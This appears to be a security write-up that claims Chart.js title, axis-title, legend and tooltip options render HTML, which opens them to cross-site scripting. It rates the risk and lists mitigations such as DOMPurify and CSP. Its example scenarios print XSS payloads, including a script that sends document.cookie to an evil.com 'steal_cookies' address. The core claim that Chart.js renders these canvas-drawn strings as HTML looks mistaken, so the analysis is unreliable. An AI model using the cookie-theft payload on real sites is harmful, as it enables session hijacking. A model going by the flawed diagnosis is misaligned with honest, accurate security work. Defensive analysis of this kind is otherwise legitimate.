## Deep Analysis: Abuse HTML String Configuration in Chart.js

**Attack Tree Path:** Abuse HTML String Configuration **HIGH RISK**

**Context:** This analysis focuses on the identified attack path within an application utilizing the Chart.js library (https://github.com/chartjs/chart.js). The vulnerability stems from the library's allowance of HTML strings in certain configuration options and the potential for developers to inadvertently introduce Cross-Site Scripting (XSS) vulnerabilities by using unsanitized user-provided data in these options.

**Detailed Breakdown of the Attack Path:**

1. **Vulnerable Configuration Options:** Chart.js offers flexibility in customizing chart elements. Several configuration options accept HTML strings for rendering text within the chart. Key areas include:
    * **Tooltips:** `options.plugins.tooltip.callbacks.label` (and similar callbacks) allow custom HTML for tooltip content.
    * **Legend Labels:** `options.plugins.legend.labels.generateLabels` can be manipulated to inject HTML into legend items.
    * **Axis Titles:** `options.scales[axisId].title.text` can accept HTML for axis titles.
    * **Chart Title:** `options.plugins.title.text` allows HTML for the main chart title.
    * **Data Labels Plugin (if used):**  Plugins like `chartjs-plugin-datalabels` might also have options accepting HTML.

2. **Unsanitized Data Input:** The core of the vulnerability lies in the application's handling of data that eventually populates these HTML-accepting configuration options. If the application directly uses user-provided data (e.g., from form inputs, URL parameters, database records) without proper sanitization, it becomes a vector for attack.

3. **HTML Injection:** An attacker can craft malicious input containing HTML tags, most notably the `<script>` tag. When this unsanitized data is used to configure the Chart.js instance, the library will render the provided HTML within the specified element.

4. **Cross-Site Scripting (XSS) Execution:**  The injected `<script>` tag will be executed by the user's browser in the context of the application's origin. This allows the attacker to:
    * **Steal Session Cookies:** Gain unauthorized access to user accounts.
    * **Redirect Users:** Send users to malicious websites.
    * **Deface the Application:** Alter the visual appearance of the page.
    * **Execute Arbitrary JavaScript:** Perform any action the user is authorized to do on the application, including accessing sensitive data, modifying information, or triggering further actions.
    * **Keylogging:** Capture user keystrokes.
    * **Phishing:** Display fake login forms to steal credentials.

**Risk Assessment:**

* **Severity: HIGH** - Successful exploitation can lead to full account compromise, data breaches, and significant damage to the application's reputation and user trust.
* **Likelihood: Medium to High** - The likelihood depends on the application's architecture and security practices. If user-provided data is directly used in Chart.js configurations without explicit sanitization, the likelihood is high. Even seemingly innocuous data sources (like database records populated by users) can be exploited if not handled carefully.
* **Exploitability: Easy** - Injecting HTML is relatively straightforward. Attackers can use simple `<script>` tags or more sophisticated payloads. Tools and techniques for identifying and exploiting XSS vulnerabilities are widely available.

**Impact Analysis:**

* **Confidentiality:**  Attackers can steal sensitive user data, including personal information, financial details, and session tokens.
* **Integrity:** Attackers can modify data displayed on the charts, leading to misinformation and potentially impacting business decisions based on inaccurate visualizations. They can also deface the application.
* **Availability:**  While less direct, attackers could potentially inject code that disrupts the functionality of the chart or the entire application, leading to denial of service.

**Example Attack Scenarios:**

1. **Malicious Tooltip:** An attacker provides a malicious name for a dataset label, such as:
   ```javascript
   const chartData = {
       datasets: [{
           label: '<img src="x" onerror="alert(\'XSS Vulnerability!\')">',
           data: [10, 20, 30]
       }]
   };
   ```
   When the user hovers over the corresponding chart element, the `onerror` event will trigger, executing the JavaScript alert. A real attacker would replace the `alert()` with more malicious code.

2. **Compromised Legend:** An application allows users to customize the names of data series. An attacker injects HTML into the series name:
   ```javascript
   const chartData = {
       datasets: [{
           label: '<a href="https://evil.com" onclick="/* malicious code */">Click Me</a>',
           data: [15, 25, 35]
       }]
   };
   ```
   The legend will now contain a clickable link that can redirect users to a phishing site or execute malicious JavaScript.

3. **XSS in Axis Title:** If an application uses user input to set the axis title:
   ```javascript
   const axisTitle = '<script>document.location="https://evil.com/steal_cookies?cookie="+document.cookie;</script>';
   const chartConfig = {
       options: {
           scales: {
               y: {
                   title: {
                       display: true,
                       text: axisTitle
                   }
               }
           }
       }
   };
   ```
   The injected script will execute when the chart is rendered, potentially redirecting the user and sending their cookies to the attacker.

**Mitigation Strategies:**

* **Strict Input Sanitization:**  **Crucially, sanitize all user-provided data before using it in any Chart.js configuration option that accepts HTML.**  This involves escaping or removing potentially harmful HTML tags and attributes. Libraries like DOMPurify are specifically designed for this purpose.
* **Contextual Output Encoding:** While Chart.js handles some basic encoding for displaying text, it's not sufficient for preventing XSS when HTML is explicitly allowed. Ensure that any HTML you intend to display is properly encoded based on the context (e.g., using HTML entity encoding).
* **Content Security Policy (CSP):** Implement a strong CSP to restrict the sources from which the browser can load resources (scripts, stylesheets, etc.). This can limit the impact of injected scripts.
* **Avoid Direct HTML Usage When Possible:**  If the desired styling or functionality can be achieved through Chart.js's built-in options or CSS, prioritize those over injecting raw HTML.
* **Regular Security Audits and Penetration Testing:**  Periodically assess the application for potential vulnerabilities, including XSS in Chart.js configurations.
* **Developer Training and Awareness:** Educate developers about the risks of XSS and the importance of secure coding practices.
* **Principle of Least Privilege:** Only grant necessary permissions to users and processes. This can limit the damage an attacker can cause even if they gain access.
* **Stay Updated:** Keep Chart.js and all other dependencies updated to the latest versions to benefit from security patches.

**Recommendations for the Development Team:**

1. **Identify all instances where user-provided data is used in Chart.js configuration options that accept HTML.**
2. **Implement robust input sanitization for all such data.**  Prioritize using a well-vetted library like DOMPurify.
3. **Review the application's CSP and ensure it is appropriately configured to mitigate XSS risks.**
4. **Conduct thorough testing to verify that the implemented sanitization effectively prevents HTML injection.**
5. **Establish secure coding guidelines that specifically address the risks associated with using HTML in Chart.js configurations.**

**Conclusion:**

The "Abuse HTML String Configuration" attack path in Chart.js presents a significant security risk due to the potential for XSS vulnerabilities. By failing to sanitize user-provided data before using it in HTML-accepting configuration options, developers can inadvertently create avenues for attackers to compromise user accounts and the application itself. A proactive approach involving strict input sanitization, CSP implementation, and ongoing security awareness is crucial to mitigate this risk and ensure the security of applications utilizing the Chart.js library. This analysis provides a detailed understanding of the attack path, its potential impact, and actionable mitigation strategies for the development team.
